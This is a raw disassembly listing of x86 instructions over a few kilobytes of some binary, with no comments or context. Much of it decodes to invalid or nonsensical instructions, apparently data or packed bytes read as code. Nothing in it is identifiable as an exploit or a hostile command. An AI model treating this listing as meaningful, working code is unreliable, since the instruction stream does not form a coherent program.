  4047cf:	xor    esi,DWORD PTR [ebx]
  4047d1:	jo     0x4047b3
  4047d3:	push   ds
  4047d4:	xor    eax,DWORD PTR [ebx+esi*2]
  4047d7:	jne    0x40482e
  4047d9:	shl    DWORD PTR [edi-0x3fa7ee39],0x69
  4047e0:	xlat   BYTE PTR ds:[ebx]
  4047e1:	sbb    al,0x72
  4047e3:	aas    
  4047e4:	ins    BYTE PTR es:[edi],dx
  4047e5:	aam    0xe5
  4047e7:	mov    ds:0xa601f336,al
  4047ec:	or     ebp,ebp
  4047ee:	add    al,0x4
  4047f0:	add    al,0xbd
  4047f2:	mov    eax,ds:0x173f9d22
  4047f7:	inc    eax
  4047f8:	add    DWORD PTR [ebp-0x3d],ebx
  4047fb:	inc    esp
  4047fc:	or     BYTE PTR [esi],bl
  4047fe:	mov    cl,0xbb
  404800:	scas   eax,DWORD PTR es:[edi]
  404801:	jb     0x404862
  404803:	jmp    0x2e169584
  404808:	add    eax,0x38175fa4
  40480d:	xlat   BYTE PTR ds:[ebx]
  40480e:	add    al,0x4
  404810:	xchg   esp,eax
  404811:	pop    ss
  404812:	cmp    eax,0x40404
	...
  40481f:	(bad)  
  404820:	iret   
  404821:	sar    bh,0xff
  404824:	(bad)  
  404825:	(bad)  
  404826:	(bad)  
  404827:	(bad)  
  404828:	(bad)  
  404829:	(bad)  
  40482a:	dec    DWORD PTR [ebx-0x61f1a175]
  404830:	fisttp QWORD PTR [edx-0x3b]
  404833:	pop    ds
  404834:	push   0x33fa8c9e
  404839:	out    0x4b,eax
  40483b:	pop    es
  40483c:	imul   esi,DWORD PTR ds:0xe7d40d88,0xffffffe5
  404843:	sbb    eax,0x4e8b8b5e
  404848:	(bad)  
  404849:	mov    ecx,DWORD PTR [ebx-0x7474f56a]
  40484f:	add    DWORD PTR [eax-0xb],edi
  404852:	mov    ds:0x47f2edc0,eax
  404857:	out    0xff,eax
  404859:	fsubr  DWORD PTR [esi-0x5]
  40485c:	call   0xa87ab570
  404861:	sbb    bh,cl
  404863:	inc    ecx
  404864:	mov    ebp,0x838bb489
  404869:	inc    edi
  40486a:	ret    
  40486b:	sbb    BYTE PTR [eax+0x27838383],dl
  404871:	push   ds
  404872:	in     eax,0x6b
  404874:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  404876:	mov    ebx,0x6f4ae222
  40487b:	pop    ds
  40487c:	sahf   
  40487d:	sbb    bl,BYTE PTR [ebp+0x22]
  404880:	or     eax,0xff9b8106
  404885:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404886:	daa    
  404887:	out    dx,eax
  404888:	mov    ah,0xb9
  40488a:	imul   ebp,esi,0x2ccc30d4
  404890:	xchg   BYTE PTR [edi+0x42],bh
  404893:	add    DWORD PTR [ebx-0x7c7c8cdb],0xffffff83
	...
  4048a2:	add    BYTE PTR ds:0x40425ed,ah
  4048a8:	add    al,0x4
  4048aa:	add    al,0x4
  4048ac:	add    al,0x4
  4048ae:	add    al,0x0
  4048b0:	add    BYTE PTR [esi+0x7],bl
  4048b3:	imul   BYTE PTR fs:[ebx-0x71]
  4048b7:	and    al,BYTE PTR [ecx+ecx*1]
  4048ba:	jno    0x40485d
  4048bc:	pop    esi
  4048bd:	add    BYTE PTR [eax+0x6],ah
  4048c0:	mov    ebx,0x258c707f
  4048c5:	ja     0x40493f
  4048c7:	into   
  4048c8:	push   esi
  4048c9:	add    BYTE PTR [eax],al
  4048cb:	sub    al,0x4f
  4048cd:	mov    al,0x9e
  4048cf:	sub    BYTE PTR cs:[eax+0x474e35be],bl
  4048d6:	mov    al,ds:0xa4e537dd
  4048db:	mov    BYTE PTR [edi+0x1746b044],dh
  4048e1:	adc    al,0xf
  4048e3:	jno    0x4048e6
  4048e5:	js     0x40489d
  4048e7:	pop    esp
  4048e8:	add    BYTE PTR [eax],al
  4048ea:	dec    eax
  4048eb:	pop    ds
  4048ec:	fild   DWORD PTR [eax]
  4048ee:	add    BYTE PTR [ebx-0x44],bh
  4048f1:	jne    0x4048f3
  4048f3:	int3   
  4048f4:	into   
  4048f5:	and    ebx,DWORD PTR ds:0x4d263bea
  4048fb:	daa    
  4048fc:	call   0x4d66d4ee
  404901:	sbb    esi,esp
  404903:	jae    0x404892
  404905:	adc    ch,BYTE PTR ss:[edi]
  404908:	test   bh,0x41
  40490b:	lock int3 
  40490d:	int3   
  40490e:	int3   
  40490f:	pop    ebp
  404910:	loope  0x4048de
  404912:	int3   
  404913:	xchg   bh,dh
  404915:	int3   
  404916:	int3   
  404917:	int3   
	...
  404920:	add    BYTE PTR [esi+0x4f],ah
  404923:	dec    ebp
  404924:	scas   eax,DWORD PTR es:[edi]
  404925:	jnp    0x4049a6
  404927:	pusha  
  404928:	xchg   esi,eax
  404929:	dec    eax
  40492a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40492b:	sbb    DWORD PTR [esi+ecx*4],edx
  40492e:	add    DWORD PTR [edi],eax
  404930:	mov    ds:0xe78ee08d,eax
  404935:	cmp    BYTE PTR [ebp+0x8e70],ch
	...
  404943:	add    cl,dh
  404945:	imul   esp,DWORD PTR [esi+0x450000a6],0x1c
  40494c:	dec    esi
  40494d:	dec    ebx
  40494e:	mov    al,0x1b
  404950:	(bad)  
  404952:	imul   BYTE PTR ds:0x4951e96c
  404958:	les    ebp,FWORD PTR [ecx+0x26d1d96c]
  40495e:	fbld   TBYTE PTR [ebx+eax*8-0x5b]
  404962:	mov    dl,0xab
  404964:	ds xchg ebx,eax
  404966:	jb     0x40495f
  404968:	or     al,0xb7
  40496a:	int3   
  40496b:	clc    
  40496c:	and    eax,0x17c60000
  404971:	add    BYTE PTR [eax],al
  404973:	mov    edi,0xf00dbc9
  404978:	mov    ch,BYTE PTR [edx]
  40497a:	mov    ah,0xb5
  40497c:	sub    dl,BYTE PTR [ebp-0x39]
  40497f:	sti    
  404980:	pop    eax
  404981:	xor    cl,al
  404983:	pop    ss
  404984:	ror    DWORD PTR [ecx],0x8f
  404987:	mov    ch,0xc3
  404989:	sahf   
  40498a:	rol    BYTE PTR [ebp+esi*2+0x54],cl
  40498e:	js     0x404936
  404990:	(bad)  
  404991:	(bad)  
  404992:	ucomiss xmm5,DWORD PTR [ecx+0x2f6cbada]
  404999:	je     0x4049de
  40499b:	dec    ebp
  40499c:	je     0x404a07
  40499e:	ins    DWORD PTR es:[edi],dx
  40499f:	cmp    al,0x65
  4049a1:	gs ins DWORD PTR es:[edi],dx
  4049a3:	imul   esi,DWORD PTR [edi+0x65],0x63662e62
  4049aa:	and    BYTE PTR gs:0x66726272,cl
  4049b1:	and    BYTE PTR [eax],ch
  4049b3:	gs je  0x404a1b
  4049b6:	jns    0x404a26
  4049b8:	outs   dx,BYTE PTR ds:[esi]
  4049b9:	jb     0x404a0e
  4049bb:	cs popa 
  4049bd:	and    BYTE PTR gs:[edx+0x72],ah
  4049c1:	inc    ebp
  4049c2:	or     ah,BYTE PTR [ebp+0xd]
  4049c5:	inc    ecx
  4049c6:	jae    0x404a04
  4049c8:	popa   
  4049c9:	and    BYTE PTR [esi+esi*2+0x79],dh
  4049cd:	and    BYTE PTR [ebx+0x3c],ah
  4049d0:	inc    ecx
  4049d1:	and    BYTE PTR [esi],bh
  4049d3:	jb     0x404a42
  4049d5:	and    dh,BYTE PTR gs:[ebx+0x2f]
  4049d9:	js     0x4049fb
  4049db:	and    BYTE PTR [eax+eiz*1+0x79],ah
  4049df:	imul   ebp,DWORD PTR [esp+eiz*2+0x77],0x6d416f57
  4049e7:	gs bound esi,QWORD PTR cs:[edx+eiz*1+0x65]
  4049ed:	bound  ebp,QWORD PTR [esi]
  4049ef:	inc    ebx
  4049f0:	je     0x404a66
  4049f2:	jne    0x404a01
  4049f4:	fs jo  0x404a17
  4049f7:	jae    0x404a19
  4049f9:	inc    ecx
  4049fa:	xchg   esi,eax
  4049fb:	xchg   edx,eax
  4049fc:	out    0x6a,eax
  4049fe:	not    BYTE PTR [ecx+0x557df48c]
  404a04:	rol    DWORD PTR [ecx-0x72e8986a],cl
  404a0a:	stos   DWORD PTR es:[edi],eax
  404a0b:	push   ds
  404a0c:	loope  0x404a6b
  404a0e:	sub    eax,DWORD PTR [esi+0xfc0b2d7]
  404a14:	cmovae esi,ebp
  404a17:	lods   al,BYTE PTR ds:[esi]
  404a18:	(bad)  
  404a19:	(bad)  
  404a1a:	sldt   WORD PTR [eax]
  404a1d:	add    BYTE PTR [eax],al
  404a1f:	add    BYTE PTR [eax],al
  404a21:	add    BYTE PTR [eax],al
  404a23:	add    BYTE PTR [edi],dh
  404a25:	mov    bh,0xab
	...
  404a2f:	add    bh,bh
  404a31:	push   DWORD PTR [ecx]
  404a33:	add    edi,DWORD PTR [ecx+ecx*8]
  404a36:	cmp    al,0x63
  404a38:	sub    al,0xc
  404a3a:	mov    edi,0x773f4d7b
  404a3f:	retf   0xa69d
  404a42:	push   0xffffffb8
  404a44:	and    edi,DWORD PTR [edi-0x25]
  404a47:	retf   
  404a48:	fdiv   st,st(5)
  404a4a:	(bad)  
  404a4b:	jmp    FWORD PTR [ebx]
  404a4d:	dec    ebx
  404a4e:	(bad)  
  404a4f:	(bad)  
  404a50:	jmp    0x404a36
  404a52:	(bad)  
  404a53:	inc    DWORD PTR [ebx]
  404a55:	mov    bl,0x0
  404a57:	jle    0x404a35
  404a59:	loop   0x404a28
  404a5b:	add    eax,0xc751227e
  404a60:	adc    al,0x5a
  404a62:	jle    0x404a91
  404a64:	cmc    
  404a65:	mul    DWORD PTR [ebp+0x37]
  404a68:	jnp    0x404ace
  404a6a:	sbb    DWORD PTR ds:0xf22e00ff,ebp
  404a70:	dec    esi
  404a71:	std    
  404a72:	add    BYTE PTR [eax],al
  404a74:	add    BYTE PTR [edi+0x29c33dec],al
  404a7a:	push   eax
  404a7b:	sub    eax,0x259f8f09
  404a80:	es mov cl,0x5d
  404a83:	inc    edi
  404a84:	in     eax,0xf0
  404a86:	fnsave [edi+ebp*4]
  404a89:	(bad)  
  404a8b:	std    
  404a8c:	stos   BYTE PTR es:[edi],al
  404a8d:	jmp    0x404ac4
  404a8f:	pop    esp
  404a90:	idiv   bh
  404a92:	adc    DWORD PTR [ebx+0x1b051c0],ecx
  404a98:	add    BYTE PTR [eax],al
  404a9a:	addr16 jmp 0x0:0x0
  404aa2:	add    BYTE PTR [eax],al
  404aa4:	add    BYTE PTR [eax],al
  404aa6:	add    BYTE PTR [eax],al
  404aa8:	or     al,0x77
  404aaa:	in     eax,0x8d
  404aac:	lea    ecx,[ebp-0x72727273]
  404ab2:	lea    ecx,[ebp-0x74b17475]
  404ab8:	sysenter 
  404aba:	mov    bh,0x4b
  404abc:	dec    ecx
  404abd:	ficom  WORD PTR [edx]
  404abf:	dec    eax
  404ac0:	cmp    DWORD PTR [esi],ebx
  404ac2:	fdiv   QWORD PTR [esi+0x2ff33b38]
  404ac8:	pop    edx
  404ac9:	scas   al,BYTE PTR es:[edi]
  404aca:	lods   al,BYTE PTR ds:[esi]
  404acb:	call   0xd569:0x8b8ba1e7
  404ad2:	xchg   ecx,eax
  404ad3:	pop    ds
  404ad4:	clc    
  404ad5:	push   esi
  404ad6:	(bad)  
  404ad7:	fmul   st(5),st
  404ad9:	mov    edi,0x391ad182
  404ade:	mov    esi,0x6a9e4b2f
  404ae3:	iret   
  404ae4:	out    dx,eax
  404ae5:	inc    ecx
  404ae6:	push   esi
  404ae7:	repnz sbb esp,DWORD PTR ds:0x8b044801
  404aee:	mov    esp,ebp
  404af0:	mov    eax,0x6e8b8b7a
  404af5:	daa    
  404af6:	push   ss
  404af7:	mov    eax,DWORD PTR [eax]
  404af9:	fdiv   QWORD PTR [eax+0x110223a5]
  404aff:	push   0x428ba468
  404b04:	sub    eax,0x42614363
  404b09:	sub    DWORD PTR [eax+0x1416ecbb],edi
  404b0f:	in     eax,dx
  404b10:	push   ebx
  404b11:	add    BYTE PTR [eax],al
  404b13:	add    BYTE PTR [esp+esi*1+0x0],bl
  404b17:	add    BYTE PTR [edi+0xf8],bl
	...
  404b25:	add    BYTE PTR [eax+0x62efffd],bl
  404b2b:	fisub  DWORD PTR [eax-0x112c865f]
  404b31:	loop   0x404b09
  404b33:	inc    DWORD PTR [edi]
  404b35:	icebp  
  404b36:	cld    
  404b37:	std    
  404b38:	call   0xccb2:0xcc3634cc
  404b3f:	int3   
  404b40:	int3   
  404b41:	int3   
  404b42:	int3   
  404b43:	int3   
  404b44:	int3   
  404b45:	int3   
  404b46:	int3   
  404b47:	mov    DWORD PTR [ecx+0x96951ca],ecx
  404b4d:	mov    DWORD PTR [ecx-0x25a6eb4a],ecx
  404b53:	pusha  
  404b54:	mov    dl,0x52
  404b56:	add    ebx,DWORD PTR [edi+0x2f690eea]
  404b5c:	jae    0x404b5b
  404b5e:	ds hlt 
  404b60:	dec    ebp
  404b61:	and    ch,BYTE PTR gs:[eax-0x7bf6f794]
  404b68:	push   ebx
  404b69:	xlat   BYTE PTR ds:[ebx]
  404b6a:	mov    gs,WORD PTR [ebx+esi*1]
  404b6d:	cmp    BYTE PTR [eax],al
  404b6f:	xor    ebx,DWORD PTR [edi]
  404b71:	lock mov DWORD PTR [ecx-0x767642f9],ecx
  404b78:	enter  0x7f7b,0x89
  404b7c:	add    BYTE PTR [ebx-0x401f8d3e],cl
  404b82:	mov    al,0x5e
  404b84:	pop    es
  404b85:	and    DWORD PTR [ebx-0xe4ebde9],ebx
  404b8b:	les    ecx,FWORD PTR [edx+0x6c]
  404b8e:	jecxz  0x404bd1
  404b90:	pop    ebp
  404b91:	xchg   edi,eax
  404b92:	aad    0x33
  404b94:	xchg   esi,eax
  404b95:	add    BYTE PTR [eax],al
  404b97:	add    BYTE PTR [ecx+0x5fe2222e],bl
  404b9d:	lahf   
  404b9e:	ror    DWORD PTR [ecx],cl
  404ba0:	into   
  404ba1:	aam    0xb1
  404ba3:	outs   dx,DWORD PTR cs:[esi]
  404ba5:	cmp    ch,BYTE PTR [esp+edi*8+0x1e5d4012]
  404bac:	shl    BYTE PTR [ebx+0x4f],1
  404baf:	ja     0x404c10
  404bb1:	jecxz  0x404bf2
  404bb3:	inc    esp
  404bb4:	jmp    0x490e4bb9
  404bb9:	or     eax,0x0
	...
  404bc6:	stos   DWORD PTR es:[edi],eax
  404bc7:	test   eax,0x2f
	...
  404bd4:	sbb    dl,BYTE PTR [esi-0x20]
  404bd7:	mov    esi,0xb23cf77f
  404bdc:	xchg   esp,eax
  404bdd:	mov    esp,0x9992df54
  404be2:	es mov ecx,0x4a6b7fa9
  404be8:	call   0x890e7e
  404bed:	add    BYTE PTR [ebx+ebx*2+0x0],al
  404bf1:	add    dh,bh
  404bf3:	xchg   ecx,eax
  404bf4:	add    BYTE PTR [eax],al
  404bf6:	pop    esp
  404bf7:	(bad)  
  404bf9:	xor    edx,edx
  404bfb:	shl    edi,1
  404bfd:	nop
  404bfe:	daa    
  404bff:	pop    esp
  404c00:	arpl   sp,sp
  404c02:	mov    al,ds:0x4bf182f8
  404c07:	sub    eax,0xba5133e6
  404c0c:	sub    BYTE PTR [ebp-0x23a80000],dl
  404c12:	jge    0x404c3b
  404c14:	add    BYTE PTR [eax],al
  404c16:	add    BYTE PTR ds:0x7614bbc4,dl
  404c1c:	stos   DWORD PTR es:[edi],eax
  404c1d:	es mov bh,0xa5
  404c20:	shr    esi,cl
  404c22:	(bad)  
  404c23:	outs   dx,BYTE PTR ds:[esi]
  404c24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c25:	nop
  404c26:	icebp  
  404c27:	push   ss
  404c28:	ins    BYTE PTR es:[edi],dx
  404c29:	adc    al,BYTE PTR [esi+0x242b797d]
  404c2f:	scas   eax,DWORD PTR es:[edi]
  404c30:	pushf  
  404c31:	ret    
  404c32:	push   ebp
  404c33:	imul   ebx,DWORD PTR [esi+0x16],0x4589701c
  404c3a:	add    BYTE PTR [eax],al
  404c3c:	cdq    
  404c3d:	mov    BYTE PTR [eax],0x0
  404c40:	add    BYTE PTR [ebx-0x7c7c7c7d],al
  404c46:	add    DWORD PTR [ebx+0x235d8383],0xffffff97
  404c4d:	mov    DWORD PTR [ecx-0x76767677],ecx
  404c53:	mov    DWORD PTR [ecx-0x62ffff77],ecx
  404c59:	jl     0x404c18
  404c5b:	push   edx
  404c5c:	ins    BYTE PTR es:[edi],dx
  404c5d:	fild   DWORD PTR [esi]
  404c5f:	and    bh,ah
  404c61:	out    dx,eax
  404c62:	sub    DWORD PTR [ebx+0xf],ebp
  404c65:	mov    dl,0xd
  404c67:	rcr    BYTE PTR [edi+0x49a3af08],1
  404c6d:	jb     0x404c07
  404c6f:	jmp    0x404c71
  404c71:	add    BYTE PTR [edx],bl
  404c73:	add    al,0xca
  404c75:	xchg   edi,eax
  404c76:	sub    BYTE PTR [ecx+0x5c595b7b],dl
  404c7c:	jb     0x404c6a
  404c7e:	jbe    0x404c32
  404c80:	and    eax,DWORD PTR [ecx]
  404c82:	xor    DWORD PTR [eax],0x3764d313
  404c88:	inc    edx
  404c89:	push   esi
  404c8a:	xlat   BYTE PTR ds:[ebx]
  404c8b:	(bad)  
  404c8c:	mov    DWORD PTR [ecx],ebx
  404c8e:	test   BYTE PTR [eax],0x0
  404c91:	mov    ch,0x53
  404c93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c94:	add    BYTE PTR [eax],al
  404c96:	xor    al,BYTE PTR ds:0x6d0000b4
  404c9c:	inc    al
  404c9e:	enter  0x97ac,0x6f
  404ca2:	retf   
  404ca3:	ds pop ss
  404ca5:	mov    bl,BYTE PTR [esi-0x2f]
  404ca8:	jo     0x404c8a
  404caa:	jmp    0x404cc5
  404cac:	dec    ebp
  404cad:	add    eax,0x3108c3a7
  404cb3:	add    BYTE PTR [eax],al
  404cb5:	add    BYTE PTR [ebp-0x61ffff8f],ch
  404cbb:	mov    al,ds:0x8b000000
  404cc0:	mov    ecx,DWORD PTR [ebx-0x74747475]
  404cc6:	mov    ecx,DWORD PTR [ebx-0x49c47cb1]
  404ccc:	mov    bh,0xde
  404cce:	daa    
  404ccf:	aas    
  404cd0:	jecxz  0x404d50
  404cd2:	ins    BYTE PTR es:[edi],dx
  404cd3:	jae    0x404c6b
  404cd5:	cmp    ah,ch
  404cd7:	lods   al,BYTE PTR ds:[esi]
  404cd8:	ret    
  404cd9:	icebp  
  404cda:	jbe    0x404d2a
  404cdc:	bound  edx,QWORD PTR [ebp+0x65696927]
  404ce2:	arpl   WORD PTR [ebp+0x22],bp
  404ce5:	or     eax,0x65626f2f
  404cea:	je     0x404d51
  404cec:	gs inc esp
  404cee:	addr16 or eax,0x726f2e20
  404cf4:	ins    DWORD PTR es:[edi],dx
  404cf5:	imul   edx,DWORD PTR [edx+0x20],0x2c6c6574
  404cfc:	and    BYTE PTR [ebx+0x2e],dh
  404cff:	inc    ecx
  404d00:	push   edx
  404d01:	bound  ebp,QWORD PTR [edi+0x61]
  404d04:	and    BYTE PTR [ebx+0x65],bl
  404d07:	and    BYTE PTR [ebp+0x73],ch
  404d0a:	ins    DWORD PTR es:[edi],dx
  404d0b:	gs ins DWORD PTR es:[edi],dx
  404d0d:	jae    0x404d7c
  404d0f:	je     0x404d7a
  404d11:	dec    ebp
  404d12:	outs   dx,DWORD PTR ds:[esi]
  404d13:	dec    ebp
  404d14:	dec    ebp
  404d15:	imul   esp,DWORD PTR gs:[ebp+0xa],0x69646f65
  404d1d:	jae    0x404d82
  404d1f:	ins    DWORD PTR es:[edi],dx
  404d20:	cs gs jns 0x404d93
  404d24:	gs or  eax,0x20657273
  404d2a:	outs   dx,BYTE PTR ds:[esi]
  404d2c:	jbe    0x404d50
  404d2e:	outs   dx,DWORD PTR ds:[esi]
  404d2f:	gs gs je 0x404da6
  404d33:	outs   dx,DWORD PTR ds:[esi]
  404d34:	and    BYTE PTR [ebp+0x20],ah
  404d37:	gs jns 0x404d5a
  404d3a:	gs imul esp,DWORD PTR ds:[edx],0x65654165
  404d42:	jns    0x404d80
  404d44:	jne    0x404d53
  404d46:	gs jne 0x404db7
  404d49:	ins    DWORD PTR es:[edi],dx
  404d4a:	and    BYTE PTR cs:[edx+0x65],ah
  404d4e:	ins    DWORD PTR es:[edi],dx
  404d4f:	sub    DWORD PTR [ebx+esi*1+0x33333333],edi
  404d56:	xor    esi,DWORD PTR [ebx]
  404d58:	xor    esi,DWORD PTR [ebx]
  404d5a:	add    BYTE PTR [eax],al
  404d5c:	dec    ebx
  404d5d:	ins    DWORD PTR es:[edi],dx
  404d5e:	sub    BYTE PTR [eax+0x0],al
  404d61:	add    BYTE PTR [edi-0x5a62a178],dh
  404d67:	int    0x26
  404d69:	out    0x74,eax
  404d6b:	fwait
  404d6c:	jb     0x404db9
  404d6e:	or     al,0x19
  404d70:	pop    eax
  404d71:	mov    ebp,0x409aa9b8
  404d76:	arpl   WORD PTR [eax],ax
  404d78:	push   edx
  404d79:	jno    0x404d1e
  404d7b:	adc    DWORD PTR [eax],edi
  404d7d:	test   al,0xeb
  404d7f:	test   BYTE PTR [edi-0x185fc41d],bh
  404d85:	add    BYTE PTR [eax],al
  404d87:	lahf   
  404d88:	xor    al,0x0
  404d8a:	add    BYTE PTR [ebp+0x29],dl
  404d8d:	lea    eax,[eax]
  404d8f:	add    al,0xbf
  404d91:	fmulp  st(6),st
  404d93:	lods   al,BYTE PTR ds:[esi]
  404d94:	in     al,dx
  404d95:	mov    al,ds:0x54289e5c
  404d9a:	popf   
  404d9b:	mov    eax,ds:0xa048377b
  404da0:	test   BYTE PTR [ebx],0x55
  404da3:	aad    0x26
  404da5:	mov    DWORD PTR [ecx+edi*4-0x73fbfbfc],eax
  404dac:	into   
  404dad:	jbe    0x404e23
  404daf:	aam    0x61
  404db1:	jl     0x404dab
  404db3:	aad    0x66
  404db5:	pop    edi
  404db6:	xor    al,0x59
  404db8:	cmp    al,0xfa
  404dba:	(bad)  
  404dbb:	hlt    
  404dbc:	jmp    0x404df6
  404dbe:	repnz fstp DWORD PTR [esi+edx*2]
  404dc2:	jae    0x404db5
  404dc4:	aas    
  404dc5:	leave  
  404dc6:	jecxz  0x404d70
  404dc8:	add    al,0x4
  404dca:	test   al,0x64
  404dcc:	enter  0x404,0x4
  404dd0:	(bad)  
  404dd1:	(bad)  
  404dd2:	(bad)  
  404dd3:	(bad)  
  404dd4:	(bad)  
  404dd5:	(bad)  
  404dd6:	(bad)  
  404dd7:	(bad)  
  404dd8:	call   FWORD PTR [esi+eax*4]
  404ddb:	cli    
  404ddc:	call   0xe92936c9
  404de1:	call   0x462936ce
  404de6:	inc    ebp
  404de7:	fwait
  404de8:	jno    0x404e2a
  404dea:	dec    eax
  404deb:	cs jae 0x404df7
  404dee:	inc    eax
  404def:	push   ds
  404df0:	inc    edx
  404df1:	jnp    0x404e37
  404df3:	shr    BYTE PTR [edi+0x28],cl
  404df6:	loop   0x404e52
  404df8:	push   ecx
  404df9:	test   al,0x95
  404dfb:	dec    esi
  404dfc:	push   edi
  404dfd:	and    al,0xd1
  404dff:	inc    ebp
  404e00:	inc    ebp
  404e01:	(bad)  
  404e03:	inc    ebp
  404e04:	inc    ebp
  404e05:	adc    bh,BYTE PTR [ebp+0x260f4545]
  404e0b:	push   esp
  404e0c:	adc    al,0x6b
  404e0e:	sub    esp,ebp
  404e10:	pop    ebp
  404e11:	loope  0x404e52
  404e13:	sub    ebx,eax
  404e15:	nop
  404e16:	pop    edi
  404e17:	mov    ecx,0x703b3059
  404e1c:	mov    eax,0x455c9490
  404e22:	mov    esi,DWORD PTR [esi-0x32]
  404e25:	or     ebx,DWORD PTR [esi]
  404e27:	mov    ecx,DWORD PTR [ebx+0x5669218b]
  404e2d:	pop    ecx
  404e2e:	push   ebp
  404e2f:	jl     0x404e6f
  404e31:	out    dx,eax
  404e32:	test   DWORD PTR [ebx-0x57],eax
  404e35:	cmp    BYTE PTR [esp+eiz*2+0x47eb6cdc],cl
  404e3c:	aam    0xaf
  404e3e:	cs inc esp
  404e41:	dec    ecx
  404e42:	and    DWORD PTR [edx],esi
  404e44:	les    esi,FWORD PTR [ebx+0x58a7e22e]
  404e4a:	les    ebx,FWORD PTR [ecx+0x31]
  404e4d:	mov    ecx,DWORD PTR [ebx-0x7474d9c1]
  404e53:	mov    edi,edi
  404e55:	(bad)  
  404e56:	(bad)  
  404e57:	(bad)  
  404e58:	(bad)  
  404e59:	(bad)  
  404e5a:	(bad)  
  404e5b:	(bad)  
  404e5c:	call   DWORD PTR [ecx-0x80]
  404e5f:	je     0x404e65
  404e61:	add    al,0x4
  404e63:	add    al,0x4
  404e65:	add    al,0x4
  404e67:	add    al,0x4
  404e69:	test   DWORD PTR [ebp-0x42194871],eax
  404e6f:	xchg   edx,eax
  404e70:	pop    eax
  404e71:	loopne 0x404ed8
  404e73:	bound  edi,QWORD PTR [edx]
  404e75:	inc    ecx
  404e76:	out    0x1b,eax
  404e78:	mov    cl,0xf9
  404e7a:	push   cs
  404e7b:	daa    
  404e7c:	jmp    0x404ef2
  404e7e:	xor    esp,DWORD PTR [edx+0x15]
  404e81:	and    esi,DWORD PTR [ecx-0x7b]
  404e84:	test   DWORD PTR [edi],edx
  404e86:	and    al,0xaf
  404e88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e89:	pop    ds
  404e8a:	cwde   
  404e8b:	and    bl,al
  404e8d:	mov    ds:0x36142ea5,eax
  404e92:	mov    edi,0xc51f435a
  404e97:	mov    esi,0x7ad51ff8
  404e9c:	loopne 0x404e8d
  404e9e:	sbb    BYTE PTR [edx],0xf
  404ea1:	dec    ebp
  404ea2:	test   DWORD PTR [ebp-0x7a20ad63],eax
  404ea8:	test   DWORD PTR [ebp+0x15],ebp
  404eab:	std    
  404eac:	test   DWORD PTR [ebx],esi
  404eae:	inc    esi
  404eaf:	jle    0x404e8d
  404eb1:	and    BYTE PTR [eax-0x4a],0xb
  404eb5:	scas   al,BYTE PTR es:[edi]
  404eb6:	fistp  DWORD PTR [edx+0x78]
  404eb9:	out    0x88,al
  404ebb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ebc:	fcomi  st,st(3)
  404ebe:	imul   edi,DWORD PTR [edi],0xd93197f
  404ec4:	xchg   ebp,eax
  404ec5:	xor    eax,0xf333333
  404eca:	xchg   ebx,eax
  404ecb:	xor    esi,DWORD PTR [ebx]
  404ecd:	or     esp,esi
  404ecf:	xor    esi,DWORD PTR [ebx]
  404ed1:	xor    eax,DWORD PTR [ebx-0x7c7c7c7d]
  404ed7:	add    DWORD PTR [ebx+0x6ee88383],0x31
  404ede:	sub    DWORD PTR [ebx-0x75],esi
  404ee1:	xor    DWORD PTR [edi],ebp
  404ee3:	ds test eax,0xea032a1e
  404ee9:	pop    ecx
  404eea:	pop    ss
  404eeb:	gs push ebp
  404eed:	mov    edx,0x964e87d7
  404ef2:	mov    dh,0x0
	...
  404efc:	test   DWORD PTR [ebp+0x55939038],eax
  404f02:	test   DWORD PTR [ebp+0x6fe0955e],eax
  404f08:	scas   al,BYTE PTR es:[edi]
  404f09:	push   0x8
  404f0b:	or     ah,BYTE PTR [edi+0x58]
  404f0e:	jp     0x404f06
  404f10:	pop    edx
  404f11:	pop    ss
  404f12:	clc    
  404f13:	out    0x61,eax
  404f15:	inc    ebp
  404f16:	(bad)  
  404f17:	sti    
  404f18:	jecxz  0x404f52
  404f1a:	xor    esp,DWORD PTR es:[esi+ebp*8-0x1e]
  404f1f:	push   ebx
  404f20:	bound  ebp,QWORD PTR [edx]
  404f22:	adc    al,0x9e
  404f24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f25:	mul    DWORD PTR [ebp-0x42417a7b]
  404f2b:	test   DWORD PTR [ebp-0x7a7cd8b3],eax
  404f31:	inc    DWORD PTR [eax+0x6f8fe773]
  404f37:	pop    edx
  404f38:	pop    es
  404f39:	pop    eax
  404f3a:	retf   0x8668
  404f3d:	jne    0x404ec2
  404f3f:	inc    ebx
  404f40:	adc    al,0x83
  404f42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f43:	imul   BYTE PTR [ecx]
  404f45:	sub    ebp,DWORD PTR [esi-0x71]
  404f48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f49:	retf   0xffff
  404f4c:	call   DWORD PTR [ebp-0xd]
  404f4f:	(bad)  
  404f50:	ffree  st(1)
  404f52:	cmc    
  404f53:	inc    edi
  404f54:	jmp    0xbf34b5b2
  404f59:	add    BYTE PTR [ebp+0x8],0xe0
  404f5d:	dec    esp
  404f5e:	add    BYTE PTR [ebx+0x3],bh
  404f61:	arpl   WORD PTR [ebx+0x34ab8adf],sp
  404f67:	xchg   esp,eax
  404f68:	(bad)  
  404f69:	sbb    edi,edi
  404f6b:	jmp    DWORD PTR [esi-0x3f7c]
  404f71:	inc    DWORD PTR [eax]
	...
  404f7b:	lods   eax,DWORD PTR ds:[esi]
  404f7c:	and    edi,DWORD PTR [edx]
	...
  404f86:	add    BYTE PTR [eax],al
  404f88:	add    BYTE PTR [eax+0x3],dh
  404f8b:	icebp  
  404f8c:	add    DWORD PTR [esi-0x69d8fd4e],edi
  404f92:	imul   edi,DWORD PTR [esi],0xb4edd92
  404f98:	iret   
  404f99:	pop    es
  404f9a:	or     DWORD PTR [ecx+0x3d80ead8],eax
  404fa0:	sub    eax,DWORD PTR [eax]
  404fa2:	add    BYTE PTR [ebp+0x58],ah
  404fa5:	add    BYTE PTR [eax],al
  404fa7:	int    0x2a
  404fa9:	add    BYTE PTR [eax],al
  404fab:	retf   0x97c0
  404fae:	pop    ebx
  404faf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404fb0:	add    dl,bh
